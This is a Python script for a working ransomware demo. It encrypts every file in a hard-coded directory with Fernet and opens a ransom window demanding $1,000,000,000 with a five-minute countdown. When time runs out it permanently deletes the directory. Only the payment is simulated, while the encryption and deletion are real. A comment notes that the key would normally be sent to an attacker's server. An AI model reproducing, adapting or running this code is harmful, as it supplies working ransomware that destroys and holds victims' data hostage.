import os
import shutil
import time
from threading import Thread
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

# # Placeholder for the directory path (CHANGE THIS TO YOUR TARGET DIRECTORY)
TARGET_DIRECTORY = "/home/maverick/Desktop/pack"  # Replace with the path to the directory you want to encrypt

# Countdown duration in seconds (e.g., 300 seconds = 5 minutes)
COUNTDOWN_DURATION = 300

# Generate a key for encryption/decryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)
KEY_FILE = "ransom_key.key"

# Save the key to a file (in a real scenario, this would be sent to an attacker's server)
with open(KEY_FILE, "wb") as key_file:
    key_file.write(key)

# Global variable to track if payment was made
payment_made = False

# Function to encrypt files in the target directory
def encrypt_files(directory):
    """
    Encrypts all files in the specified directory and its subdirectories.
    """
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = cipher_suite.encrypt(file_data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                print(f"Encrypted: {file_path}")
            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")

# Function to decrypt files in the target directory
def decrypt_files(directory):
    """
    Decrypts all files in the specified directory and its subdirectories.
    """
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)
                print(f"Decrypted: {file_path}")
            except Exception as e:
                print(f"Error decrypting {file_path}: {e}")

# Function to delete the directory and all its contents
def delete_directory(directory):
    """
    Deletes the specified directory and all its contents.
    """
    try:
        shutil.rmtree(directory)
        print(f"Directory {directory} and all contents deleted permanently.")
    except Exception as e:
        print(f"Error deleting directory {directory}: {e}")

# Countdown timer function
def countdown_timer(window, time_label, time_left):
    """
    Runs a countdown timer and updates the GUI. If time runs out, deletes the directory.
    """
    global payment_made
    for remaining in range(time_left, -1, -1):
        if payment_made:
            return  # Exit the countdown if payment is made
        mins, secs = divmod(remaining, 60)
        timeformat = f"Time Left: {mins:02d}:{secs:02d}"
        time_label.config(text=timeformat)
        window.update()
        time.sleep(1)
    if not payment_made:
        time_label.config(text="Time's up! Data deleted.")
        window.update()
        delete_directory(TARGET_DIRECTORY)
        messagebox.showerror("Time's Up", "Time expired. All data has been deleted permanently.")
        window.destroy()

# Simulate a local transaction (mockup for demo purposes)
def simulate_transaction(window, time_label):
    """
    Creates a simple GUI window to simulate a ransom payment transaction.
    """
    global payment_made
    transaction_window = tk.Toplevel(window)
    transaction_window.title("Ransom Payment")
    transaction_window.geometry("400x200")
    
    label = tk.Label(transaction_window, text="Enter Payment Amount (Minimum $1,000,000,000)")
    label.pack(pady=10)
    
    entry = tk.Entry(transaction_window)
    entry.pack(pady=10)
    
    def complete_payment():
        """
        Simulates a successful payment if the entered amount is at least $1,000,000,000,
        then decrypts files.
        """
        global payment_made
        try:
            amount = float(entry.get())
            if amount >= 1_000_000_000:  # Check if the amount is at least $1,000,000,000
                payment_made = True
                messagebox.showinfo("Payment Successful", "Transaction completed. Files will be decrypted.")
                transaction_window.destroy()
                decrypt_files(TARGET_DIRECTORY)
                window.destroy()
            else:
                messagebox.showerror("Error", "Payment amount must be at least $1,000,000,000.")
        except ValueError:
            messagebox.showerror("Error", "Invalid input. Please enter a valid number.")
    
    pay_button = tk.Button(transaction_window, text="Pay Now", command=complete_payment)
    pay_button.pack(pady=10)

# Display ransom demand dialog box with countdown
def show_ransom_dialog():
    """
    Shows a warning dialog box demanding ransom, starts countdown, and prompts for payment.
    """
    root = tk.Tk()
    root.title("RANSOM DEMAND")
    root.geometry("500x300")
    
    warning_label = tk.Label(root, text="All your files have been encrypted!\n"
                                        "Pay $1,000,000,000 to decrypt your data.\n"
                                        "If time runs out, all data will be deleted forever!", 
                             font=("Arial", 12, "bold"), fg="red")
    warning_label.pack(pady=20)
    
    time_label = tk.Label(root, text="", font=("Arial", 14))
    time_label.pack(pady=10)
    
    # Start countdown in a separate thread so GUI remains responsive
    timer_thread = Thread(target=countdown_timer, args=(root, time_label, COUNTDOWN_DURATION))
    timer_thread.start()
    
    # Open payment window
    simulate_transaction(root, time_label)
    
    root.mainloop()

# Main execution
if __name__ == "__main__":
    if os.path.exists(TARGET_DIRECTORY):
        print(f"Targeting directory: {TARGET_DIRECTORY}")
        encrypt_files(TARGET_DIRECTORY)
        show_ransom_dialog()
    else:
        print(f"Directory {TARGET_DIRECTORY} does not exist. Please update the path.")
    